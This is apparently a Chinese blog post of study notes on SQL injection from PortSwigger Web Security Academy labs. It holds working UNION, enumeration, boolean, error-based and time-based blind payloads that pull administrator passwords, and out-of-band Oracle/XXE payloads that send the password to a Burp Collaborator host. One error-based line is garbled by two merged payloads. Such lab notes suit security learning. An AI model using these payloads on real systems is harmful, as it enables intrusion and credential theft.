---
layout: article
title: SQL injection--Web Security Academy 1
mathjax: true
key: a00002	
---

## 前言

最近学习实践的过程深感自己基础的不足和英语水平的匮乏，正好又找到一个很好的学习网站（https://portswigger.net/web-security/learning-path 既有知识点也有相应的靶场，唯一的缺点就是全英文的），于是想借此重新打一遍web安全基础，并提高自己的英语水平，目前已经学习了XXE，SQL注入和Authentication部分，正在看OAuth的部分，今天先给出SQL injection 学习过程中的笔记，供分享与备忘。

Web Security Academy 分了如下5个点来介绍SQL注入，如下：

## 1.Retrieving hidden data

- where you can modify an SQL query to return  additional results.

  +是拼接字符串的；

  --是SQL的注释标记

## 2.Subverting application logic

- where you can change a query to interfere with the application's logic.

## 3.UNION attacks

- where you can retrieve data from different database tables.

### 两个条件：

1. The individual queries must return the **same number of columns**.
2. The **data types** in each column must **be compatible** between the individual queries.

​               `( 'UNION SELECT 'a',NULL,NULL,NULL--)`

### 	猜columns：

```sql
order by *num --
union select NULL,NULL --
```

There is a built-in table on Oracle called **DUAL** which can be used for this purpose. 
So the injected queries on Oracle would need to look like: 

```sql
UNION SELECT NULL FROM DUAL--
```

### Retrieving multiple values within a single column

```sql
concat(username,':',password)
username||'~'||password
```

## 4.Examining the database

- where you can extract information about the version and structure of the database.

#### Oracle

- On Oracle databases, every SELECT statement must specify a table to select FROM

  There is a built-in table on Oracle called dual which you can use for this purpose. For example: 

```sql
UNION SELECT 'abc' FROM dual
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

### Listing the contents of the database

#### EXCEPT Oracle

```sql
'+union+select+table_name,NULL+from+information_schema.tables--+
'+union+select+column_name,NULL+from+information_schema.columns+where+table_name='pg_user'--+
'+union+select+usename,passwd+from+pg_user--+
```

#### Oracle

```sql
'+union+select+NULL,NULL+from+dual--+
'+union+select+NULL,NULL+from+all_tables--+
'+union+select+table_name,NULL+from+all_tables--+
'+union+select+column_name,NULL+from+all_tab_columns+where+table_name='USERS_QCCECD'--+
'+union+select+USERNAME_WMJDSJ,PASSWORD_MPFXMQ+from+USERS_QCCECD--+
```

### 5.Blind SQL injection, 

- where the results of a query you control are not returned in the application's responses

#### Exploiting blind SQL injection by triggering conditional responses（Boolean）

```sql
TrackingId=xyz' AND '1'='1  	--验证
TrackingId=xyz' AND '1'='2  	--确定显示不同
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a  	--确定数据表
--confirming that there is a user called administrator.
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a  	
--确定字段长度
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a  	
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a   	

```

#### Inducing conditional responses by triggering SQL errors（报错）

```sql
TrackingId=xyz'    	--verify the vulnerability 
TrackingId=xyz''    --error disappears
TrackingId=xyz'||(SELECT '')||'   --still error ,might be oracle
TrackingId=xyz'||(SELECT '' FROM dual)||'     --confirm oracle
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'	 --table confirmed
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' --error message is received
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'		
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'		--verify table
--username verified
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'	
-get the info
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

#### Exploiting blind SQL injection by triggering time delays

| **Oracle**     | dbms_pipe.receive_message(('a'),10) |
| -------------- | ----------------------------------- |
| **Microsoft**  | WAITFOR  DELAY '0:0:10'             |
| **PostgreSQL** | SELECT  pg_sleep(10)                |
| **MySQL**      | SELECT  sleep(10)                   |

example ：  `'||SELECT sleep(10)--`  

**分号**用 <font color="red">%3B</font>

```sql
'%3Bselect case when (1=1) then pg_sleep(10) else pg_sleep(0) end--

'%3Bselect case when (username='administrator') then pg_sleep(5) else pg_sleep(0) end from users--

'%3Bselect case when (username='administrators') then pg_sleep(5) else pg_sleep(0) end from users--

'%3Bselect case when (length(password)>20) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator'--

'%3Bselect case when (substr(password,1,1)='a') then pg_sleep(2) else pg_sleep(0) end from users where username='administrator'--
```

#### Exploiting blind SQL injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques

##### oracle（ combined with xxe）example：

```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//dp61vdo4svrlp985ts0r562e95fw3l.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

retrive data

```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.kym84kxb120syghc2z9yedblico4ct.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### SQL injection cheat sheet

链接包含常见不同数据库的绕过方法

[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)